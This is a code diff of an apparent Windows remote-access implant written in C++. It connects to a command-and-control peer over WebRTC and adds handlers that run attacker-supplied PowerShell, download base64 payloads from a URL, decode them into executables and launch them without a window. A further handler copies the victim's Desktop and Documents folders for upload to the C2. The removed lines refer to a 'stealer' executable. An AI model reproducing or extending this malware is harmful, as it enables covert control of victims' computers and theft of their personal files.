@@ -1,7 +1,6 @@
 #include "rtc/rtc.hpp"
 
 #include "parse_cl.h"
-#include "helpers.h"
 #include <nlohmann/json.hpp>
 
 #include <algorithm>
@@ -20,13 +19,14 @@
 #include <Shlobj.h>
 #include <filesystem>
 #include <iterator>
+#include <regex>
 #include "winnls.h"
 #include "shobjidl.h"
 #include "objbase.h"
 #include "objidl.h"
 #include "shlguid.h"
 
-//#include "helpers.h"
+#include "helpers.h"
 
 using namespace rtc;
 using namespace std;
@@ -45,21 +45,14 @@ string localId;
 string data_directory;
 string user_directory;
 
-
-//string randomId(size_t length);
 string parseMessage(string message);
-void createFileFromBase64String(char *filename);
-int runScript(char *file_source, char *file_output);
 int setupDirectory();
 int setupPersist();
-//void HideConsole();
-//std::string stream_as_string(std::istream &stm);
-//HRESULT CreateLink(LPCSTR lpszPathObj, LPCSTR lpszPathLink, LPCSTR lpszPath, LPCSTR lpszDesc);
-//std::string getLog(std::string filename);
-//std::string getExePath(); 
-//SYSTEM_INFO getSystemInfo(std::string data);
-//inline bool fileExists(const std::string &name);
-
+void createFileFromBase64String(char *filename);
+int runScript(char *file_source, char *file_output);
+int downloadFile(string url, string destName);
+void copyData();
+vector<string> makeTargetPaths();
 
 const string c2_id = "6969";
 const string stunServer = "stun:stun.l.google.com:19302";
@@ -189,7 +182,7 @@ int main(int argc, char **argv) try {
 		dc->onClosed([c2id]() { 
 			cout << "DataChannel from " << c2id << " closed" << endl; 
 			connected = false;
-
+			return;
 		});
 
 		//On received Message
@@ -238,6 +231,8 @@ string parseMessage(string message) {
 	string cmd3 = "system-info"; // Asks for system information
 	string cmd4 = "load";        // Loads a given file (base64 format)
 	string cmd5 = "cmd";
+	string cmd6 = "video";
+	string cmd7 = "copy";
 
 	/***
 	 * list-implants | List the implants connected on the network.
@@ -272,50 +267,189 @@ string parseMessage(string message) {
 		              activeProcessorMask;
 		return answer;
 
-		/***
-		 * load | Loads a base64 string to an executable and executes it
-		 ***/
+	/***
+	* load | Loads a base64 string to an executable and executes it
+	***/
 	} else if (strncmp(message.c_str(), cmd4.c_str(), cmd4.size()) == 0) {
 		char *filename = "prueba.txt";
 		cout << "RECEIVED DATA" << endl;
-		string numberStr = message.substr(message.find(":") + 1,
-		                                  message.find("::") +
-		                                      1); // Number of messages to retrieve in base64 string
-		int number = stoi(numberStr);
-		string data = message.substr(message.find("::") + 2); // Actual string
-		cout << number << endl;
-		if (number == 0) { // Create new file
-			std::ofstream outfile(filename);
-			outfile << data;
-			outfile.close();
-		} else { // Append
-			std::ofstream outfile;
-			outfile.open(filename, std::ios_base::app);
-			outfile << data;
-			outfile.close();
-			if (number == 2) {
-				createFileFromBase64String(filename);
-			}
-		}
 
-
+		string data = message.substr(message.find(":") + 1);
+		downloadFile(data, "st.txt");
+		Sleep(5000);
+		createFileFromBase64String("st.txt");
 		return "COMPLETED";
+	
+	/***
+	* cmd (Powershell) | Runs the given command in powershell
+	***/
+
 	} else if (strncmp(message.c_str(), cmd5.c_str(), cmd5.size()) == 0) {
 		STARTUPINFO info = {sizeof(info)};
 		PROCESS_INFORMATION processInfo;
 		string data = message.substr(message.find(":") + 1); // Actual string
-		
+
 		string cmd = "powershell.exe " + data;
 		LPSTR cmd2 = const_cast<char *>(cmd.c_str());
 
 		// Runs powershell command to create .exe
 		CreateProcess(NULL, cmd2, NULL, NULL, TRUE, 0, NULL, NULL, &info, &processInfo);
-		return "Completed";
+
+		return "COMPLETED";
+
+	/***
+	* display video | Displays .mp4 video from url
+	***/
+	} else if (strncmp(message.c_str(), cmd6.c_str(), cmd6.size()) == 0) {
+		string data = message.substr(message.find(":") + 1);
+
+		string cmd = "powershell.exe $V = '" + data + "';\n$D = '" + data_directory +
+		             "\\v.mp4';\n$WebClient = New-Object "
+		             "System.Net.WebClient;\n$WebClient.DownloadFile($V,$D);" +
+		             data_directory + "\\v.mp4;";
+
+		LPSTR cmd_s = const_cast<char *>(cmd.c_str());
+		LPSTR cmd2_s = const_cast<char *>(cmd2.c_str());
+
+		STARTUPINFO info = {sizeof(info)};
+		PROCESS_INFORMATION processInfo;
+		CreateProcess(NULL, cmd_s, NULL, NULL, TRUE, 0, NULL, NULL, &info, &processInfo);
+
+		return "COMPLETED";
+
+	/***
+	* copy | Copies main folders and files to a new directory
+	*		 Compresses the documents
+	*		 Uploads compressed file to C2
+	***/
+	} else if (strncmp(message.c_str(), cmd7.c_str(), cmd7.size()) == 0) {
+		copyData();
+		//TODO: Compress data & Upload data
+		return "COMPLETED";
 	} else
 		cout << message << endl;
 
 	return "Received correctly";
 }
+
+
+/***
+* copyData | Finds and copies all the main user files and folders to a single directory
+***/
+void copyData() { 
+	// TODO: Avoid files with extensions in ignoreExt
+	string target = data_directory + "\\backup";
+	vector<string> ignoreExt = {".exe", ".lnk", ".ini"};
+
+	vector<string> dirTargets = makeTargetPaths();
+
+	//Create folder if it doesnt exist
+	if (GetFileAttributes(target.c_str()) == INVALID_FILE_ATTRIBUTES) {
+		filesystem::create_directories(target.c_str());
+	}
+
+	for (int i = 0; i < dirTargets.size(); i++) {
+		std::string path = dirTargets[i];
+		
+		copyRecursive(path, target);
+	}
+}
+
+
+vector<string> makeTargetPaths() { 
+	vector<string> l;
+	l.push_back(user_directory + "\\Desktop");
+	l.push_back(user_directory + "\\Documents");
+	//l.push_back(user_directory + "\\Pictures");
+	//l.push_back(user_directory + "\\Downloads");
+
+	//TODO : Make a tree iterator algorithm to analyze every folder
+	return l;
+}
+    /***
+* downloadFile | Downloads a file to the data directory
+***/
+int downloadFile(string url, string destName) {
+
+	string cmd = "powershell.exe $URL = '" + url + "';\n$D = '" + data_directory + "\\" + destName +
+	             "';\n$WebClient = New-Object System.Net.WebClient;\n$WebClient.DownloadFile($URL,$D);";
+
+	LPSTR cmd_s = const_cast<char *>(cmd.c_str());
+
+	STARTUPINFO info = {sizeof(info)};
+	PROCESS_INFORMATION processInfo;
+	CreateProcess(NULL, cmd_s, NULL, NULL, TRUE, 0, NULL, NULL, &info, &processInfo);
+	return 1;
+}
+
+/***
+ * createFileFromBase | Creates a binary from a base64 string and runs it
+ ***/
+void createFileFromBase64String(char *filename) {
+
+	string destName = std::regex_replace(filename, std::regex(".txt"), ".exe");
+	string logName = std::regex_replace(filename, std::regex(".txt"), "-log.txt");
+	cout << destName << endl;
+	cout << logName << endl;
+
+	STARTUPINFO info = {sizeof(info)};
+	PROCESS_INFORMATION processInfo;
+	string cmd = "powershell.exe $FileName = Get-Content '" + data_directory + "\\" + filename +
+	             "'\n$Destination = '" + data_directory + "\\" + destName +
+				 "'\n[IO.File]::WriteAllBytes($Destination, "
+	             "[Convert]::FromBase64String($FileName))";
+	LPSTR cmdF = const_cast<char *>(cmd.c_str());
+
+	// Runs powershell command to create .exe
+	CreateProcess(NULL, cmdF, NULL, NULL, TRUE, 0, NULL, NULL, &info, &processInfo);
+
+	// Runs .exe / script
+	string s = data_directory + "\\" + destName;
+	string o = data_directory + "\\" + logName;
+	runScript(&s[0], &o[0]); // To test
+	cout << "TEST COMPLETED***" << endl;
+}
+
+/***
+ * runScript | Runs given .exe/script and stores the log output on the given file
+ ***/
+int runScript(char *file_source, char *file_output) {
+
+	SECURITY_ATTRIBUTES sa;
+	sa.nLength = sizeof(sa);
+	sa.lpSecurityDescriptor = NULL;
+	sa.bInheritHandle = TRUE;
+
+	// Creates Handle
+	HANDLE h = CreateFile(file_output, FILE_APPEND_DATA, FILE_SHARE_WRITE | FILE_SHARE_READ, &sa,
+	                      OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
+
+	PROCESS_INFORMATION pi;
+	STARTUPINFO si;
+	BOOL ret = FALSE;
+	DWORD flags = CREATE_NO_WINDOW;
+
+	// Retrieve parameters and set flags on 'si'
+	ZeroMemory(&pi, sizeof(PROCESS_INFORMATION));
+	ZeroMemory(&si, sizeof(STARTUPINFO));
+	si.cb = sizeof(STARTUPINFO);
+	si.dwFlags |= STARTF_USESTDHANDLES;
+	si.hStdInput = NULL;
+	si.hStdError = h;
+	si.hStdOutput = h;
+
+	// Execute command and obtain output
+	ret = CreateProcess(NULL, file_source, NULL, NULL, TRUE, flags, NULL, NULL, &si, &pi);
+
+	if (ret) {
+		CloseHandle(pi.hProcess);
+		CloseHandle(pi.hThread);
+		return 0;
+	}
+
+	return 1;
+}
+
 
 
 /***
@@ -399,66 +533,9 @@ int setupPersist(){
 /***
  * createFileFromBase | Creates a binary from a base64 string
  ***/
-void createFileFromBase64String(char *filename) {
-
-	STARTUPINFO info = {sizeof(info)};
-	PROCESS_INFORMATION processInfo;
-	string cmd = "powershell.exe $FileName = Get-Content '" + data_directory +
-	             "\\stealer.txt'\n$Destination = '" + data_directory +
-	             "\\stealer.exe'\n[IO.File]::WriteAllBytes($Destination, "
-	             "[Convert]::FromBase64String($FileName))";
-	LPSTR cmd2 = const_cast<char *>(cmd.c_str());
-
-	// Runs powershell command to create .exe
-	CreateProcess(NULL, cmd2, NULL, NULL, TRUE, 0, NULL, NULL, &info, &processInfo);
-
-	// Runs .exe / script
-	string s = data_directory + "\\stealer.exe";
-	string o = data_directory + "\\stealer_log.txt";
-	runScript(&s[0], &o[0]); // To test
-	cout << "TEST COMPLETED***" << endl;
-}
 
 
-/***
- * runScript | Runs given .exe/script and stores the log output on the given file
- ***/
-int runScript(char *file_source, char *file_output) {
 
-	SECURITY_ATTRIBUTES sa;
-	sa.nLength = sizeof(sa);
-	sa.lpSecurityDescriptor = NULL;
-	sa.bInheritHandle = TRUE;
-
-	// Creates Handle
-	HANDLE h = CreateFile(file_output, FILE_APPEND_DATA, FILE_SHARE_WRITE | FILE_SHARE_READ, &sa,
-	                      OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
-
-	PROCESS_INFORMATION pi;
-	STARTUPINFO si;
-	BOOL ret = FALSE;
-	DWORD flags = CREATE_NO_WINDOW;
-
-	// Retrieve parameters and set flags on 'si'
-	ZeroMemory(&pi, sizeof(PROCESS_INFORMATION));
-	ZeroMemory(&si, sizeof(STARTUPINFO));
-	si.cb = sizeof(STARTUPINFO);
-	si.dwFlags |= STARTF_USESTDHANDLES;
-	si.hStdInput = NULL;
-	si.hStdError = h;
-	si.hStdOutput = h;
-
-	// Execute command and obtain output
-	ret = CreateProcess(NULL, file_source, NULL, NULL, TRUE, flags, NULL, NULL, &si, &pi);
-
-	if (ret) {
-		CloseHandle(pi.hProcess);
-		CloseHandle(pi.hThread);
-		return 0;
-	}
-
-	return 1;
-}
 
 
 // Create and setup a PeerConnection
